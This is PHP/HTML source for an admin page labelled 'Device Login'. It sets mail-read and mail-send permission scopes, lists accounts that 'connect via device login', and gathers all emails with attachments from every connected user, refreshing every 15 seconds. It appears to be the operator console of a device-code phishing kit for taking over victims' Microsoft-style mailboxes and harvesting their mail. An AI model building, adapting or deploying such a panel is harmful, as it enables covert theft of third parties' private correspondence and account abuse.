<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/helpers.php';
$basePath = (dirname($_SERVER['SCRIPT_NAME']) === '/' || dirname($_SERVER['SCRIPT_NAME']) === '\\') ? '' : dirname($_SERVER['SCRIPT_NAME']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin - Device Login</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; padding: 24px; }
    h1 { margin-bottom: 24px; font-size: 24px; }
    .section { background: #fff; border-radius: 8px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
    h2 { font-size: 16px; margin-bottom: 16px; color: #333; }
    .scope-list { display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 16px; }
    .scope-item { display: flex; align-items: center; gap: 8px; padding: 8px 12px; background: #f0f0f0; border-radius: 6px; }
    button { padding: 10px 20px; background: #0078D4; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; }
    button:hover { background: #106EBE; }
    button.danger { background: #C50F1F; }
    button.danger:hover { background: #a00; }
    .accounts { list-style: none; }
    .accounts li { display: flex; align-items: center; justify-content: space-between; padding: 12px; border-bottom: 1px solid #eee; }
    .accounts li:last-child { border-bottom: none; }
    .msg { margin-top: 12px; padding: 10px; border-radius: 6px; font-size: 14px; }
    .msg.success { background: #d4edda; color: #155724; }
    .msg.error { background: #f8d7da; color: #721c24; }
    .mail-row { padding: 12px; border-bottom: 1px solid #eee; }
    .mail-subject { font-weight: 600; color: #333; }
    .mail-meta { font-size: 12px; color: #666; margin-top: 4px; }
    .mail-attachments { font-size: 12px; color: #0078D4; margin-top: 4px; }
    a { color: #0078D4; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <a href="index.php">← Back to Login</a>
  <h1>Admin Panel</h1>

  <div class="section">
    <h2>App Permissions (Scopes)</h2>
    <p style="margin-bottom: 12px; font-size: 14px; color: #666;">Select which permissions the app requests.</p>
    <div class="scope-list" id="scopeList"></div>
    <button id="savePerms">Save Permissions</button>
    <div id="permMsg"></div>
  </div>

  <div class="section">
    <h2>Connected Accounts</h2>
    <p style="margin-bottom: 12px; font-size: 14px; color: #666;">When someone connects via device login, they appear here. Auto-refreshes every 15 sec.</p>
    <button id="refreshAccounts" style="margin-bottom: 12px;">Refresh Now</button>
    <ul class="accounts" id="accountsList"></ul>
  </div>

  <div class="section">
    <h2>All Emails with Attachments (A–Z)</h2>
    <p style="margin-bottom: 12px; font-size: 14px; color: #666;">Mails from all connected users. Sorted by subject.</p>
    <button id="loadMails">Load Mails</button>
    <div id="mailsStatus" class="msg" style="margin-top: 8px; display: none;"></div>
    <div id="mailsList" style="margin-top: 16px;"></div>
  </div>

  <script>
    var API_BASE = '<?php echo addslashes($basePath); ?>';
    if (API_BASE && !/\/$/.test(API_BASE)) API_BASE += '/';
    var AVAILABLE_SCOPES = ["Mail.Send", "User.Read", "Mail.Read", "Mail.ReadWrite"];
    var scopeList = document.getElementById('scopeList');
    var savePerms = document.getElementById('savePerms');
    var permMsg = document.getElementById('permMsg');
    var accountsList = document.getElementById('accountsList');

    function safeJson(text) {
      try { return JSON.parse(text); } catch (e) { return null; }
    }

    function loadPermissions() {
      fetch(API_BASE + 'api/admin/permissions.php').then(function(r) { return r.text(); }).then(function(text) {
        var data = safeJson(text);
        var scopes = (data && data.scopes) ? data.scopes : ["Mail.Send", "User.Read"];
        scopeList.innerHTML = AVAILABLE_SCOPES.map(function(s) {
          return '<label class="scope-item"><input type="checkbox" value="' + s + '"' + (scopes.indexOf(s) >= 0 ? ' checked' : '') + '> ' + s + '</label>';
        }).join('');
      });
    }

    savePerms.onclick = function() {
      var checked = [].slice.call(scopeList.querySelectorAll('input:checked')).map(function(c) { return c.value; });
      fetch(API_BASE + 'api/admin/permissions.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ scopes: checked })
      }).then(function(r) { return r.text(); }).then(function(text) {
        var data = safeJson(text);
        permMsg.className = 'msg ' + (data && data.ok ? 'success' : 'error');
        permMsg.textContent = data && data.ok ? 'Permissions saved.' : 'Failed to save.';
      });
    };

    function escapeHtml(s) {
      var d = document.createElement('div');
      d.textContent = s;
      return d.innerHTML;
    }

    function loadAccounts() {
      fetch(API_BASE + 'api/admin/accounts.php').then(function(r) { return r.text(); }).then(function(text) {
        var data = safeJson(text);
        var accounts = (data && data.accounts) ? data.accounts : {};
        var entries = Object.entries(accounts);
        accountsList.innerHTML = entries.length === 0
          ? '<li style="color:#666;">No connected accounts yet. Users will appear here when they complete device login.</li>'
          : entries.map(function(kv) {
              var email = kv[0], info = kv[1];
              return '<li><div><strong>' + escapeHtml(email) + '</strong>' +
                (info.connected_at ? '<div style="font-size:12px;color:#666;margin-top:4px;">Connected: ' + escapeHtml(info.connected_at) + '</div>' : '') +
                '</div><button class="danger" data-email="' + escapeHtml(email) + '" onclick="revoke(this.dataset.email)">Revoke</button></li>';
            }).join('');
      });
    }

    function revoke(email) {
      fetch(API_BASE + 'api/admin/revoke.php?email=' + encodeURIComponent(email), { method: 'POST' })
        .then(function() { loadAccounts(); loadMails(); });
    }

    function loadMails() {
      var statusEl = document.getElementById('mailsStatus');
      var listEl = document.getElementById('mailsList');
      statusEl.style.display = 'block';
      statusEl.className = 'msg';
      statusEl.textContent = 'Loading...';
      listEl.innerHTML = '';
      fetch(API_BASE + 'api/admin/mails.php').then(function(r) { return r.json().catch(function() { return {}; }); }).then(function(data) {
        var mails = data.mails || [];
        if (mails.length === 0) {
          statusEl.textContent = 'No emails with attachments. Connect users first.';
          statusEl.className = 'msg';
        } else {
          statusEl.textContent = 'Showing ' + mails.length + ' email(s) with attachments (A–Z)';
          statusEl.className = 'msg success';
          var fmt = function(n) { return n >= 1048576 ? (n/1048576).toFixed(1)+' MB' : n >= 1024 ? (n/1024).toFixed(1)+' KB' : n+' B'; };
          listEl.innerHTML = mails.map(function(m) {
            if (m.error) return '<div class="mail-row"><span class="mail-subject">' + m.account + ': ' + m.error + '</span></div>';
            var atts = (m.attachments || []).map(function(a) { return (a.name || 'file') + ' (' + fmt(a.size || 0) + ')'; }).join(', ');
            return '<div class="mail-row"><div><div class="mail-subject">' + escapeHtml(m.subject || '(No subject)') + '</div>' +
              '<div class="mail-meta">From: ' + escapeHtml(m.from || '') + ' • ' + (m.date || '') + ' • Account: ' + escapeHtml(m.account || '') + '</div>' +
              (atts ? '<div class="mail-attachments">📎 ' + escapeHtml(atts) + '</div>' : '') + '</div></div>';
          }).join('');
        }
      }).catch(function(e) {
        statusEl.textContent = 'Error: ' + e.message;
        statusEl.className = 'msg error';
      });
    }

    document.getElementById('loadMails').onclick = loadMails;
    document.getElementById('refreshAccounts').onclick = function() { loadAccounts(); loadMails(); };

    loadPermissions();
    loadAccounts();
    loadMails();
    setInterval(function() { loadAccounts(); loadMails(); }, 15000);
  </script>
</body>
</html>
